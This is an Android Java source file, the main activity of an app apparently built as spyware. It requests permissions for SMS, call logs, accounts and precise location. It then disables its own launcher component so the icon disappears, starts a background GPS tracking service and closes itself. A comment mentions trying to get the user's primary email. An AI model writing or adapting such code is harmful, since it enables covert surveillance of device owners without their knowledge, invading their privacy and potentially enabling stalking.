package com.important.mine.systems;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.intentfilter.androidpermissions.PermissionManager;

import static java.util.Collections.singleton;

public class MainActivity extends Activity {

    private Button btn_start, btn_stop;
    private TextView textView;
    private BroadcastReceiver broadcastReceiver;

    @Override
    protected void onResume() {
        super.onResume();
        if(broadcastReceiver == null){
            broadcastReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                //   textView.append("\n" +intent.getExtras().get("coordinates"));
                }
            };
        }
        registerReceiver(broadcastReceiver,new IntentFilter("location_update"));
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(broadcastReceiver != null){
            unregisterReceiver(broadcastReceiver);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main1);
            PermissionManager permissionManager = PermissionManager.getInstance(getApplicationContext());
            permissionManager.checkPermissions(singleton(Manifest.permission.READ_SMS), new PermissionManager.PermissionRequestListener() {
                @Override
                public void onPermissionGranted() {

                }

                @Override
                public void onPermissionDenied() {

                }
            });
            permissionManager.checkPermissions(singleton(Manifest.permission.GET_ACCOUNTS), new PermissionManager.PermissionRequestListener() {
                @Override
                public void onPermissionGranted() {

                }

                @Override
                public void onPermissionDenied() {

                }
            });

            permissionManager.checkPermissions(singleton(Manifest.permission.READ_CALL_LOG), new PermissionManager.PermissionRequestListener() {
                @Override
                public void onPermissionGranted() {

                }

                @Override
                public void onPermissionDenied() {

                }
            });


            permissionManager.checkPermissions(singleton(Manifest.permission.ACCESS_FINE_LOCATION), new PermissionManager.PermissionRequestListener() {
                @Override
                public void onPermissionGranted() {

                }

                @Override
                public void onPermissionDenied() {

                }
            });




            //trying to get the primary registered email address

            //trying to get the primary registered email address



   PackageManager packageManager = getApplicationContext().getPackageManager();
   ComponentName componentName = new ComponentName(getApplicationContext(), MainActivity.class);
   packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);



    btn_start = (Button) findViewById(R.id.btn_stop);
    btn_stop = (Button) findViewById(R.id.button2);
    textView = (TextView) findViewById(R.id.textView);

       runtime_permissions();
    if (!runtime_permissions()) {
        enable_buttons();

    }
    try {
        Intent i = new Intent(getApplicationContext(), GPS_Service.class);
        startService(i);
    }catch (Exception ex){}
this.finishAffinity();
}catch (Exception e)
{}
    }
    private void enable_buttons() {

        btn_start.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent i =new Intent(getApplicationContext(),GPS_Service.class);
                startService(i);
            }
        });

        btn_stop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

               // Intent i = new Intent(getApplicationContext(),GPS_Service.class);
                //stopService(i);
            }
        });
    }

    private boolean runtime_permissions() {
        if(Build.VERSION.SDK_INT >= 23 && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
                != PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED)

        {
            requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.GET_ACCOUNTS,
                    Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.GET_ACCOUNTS},100);
            return true;
        }

        return false;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED
                    && grantResults[2] == PackageManager.PERMISSION_GRANTED && grantResults[3] == PackageManager.PERMISSION_GRANTED
                    && grantResults[4] == PackageManager.PERMISSION_GRANTED)
            {
                runtime_permissions();
                enable_buttons();
            } else {
                runtime_permissions();
            }
        }
    }



    }
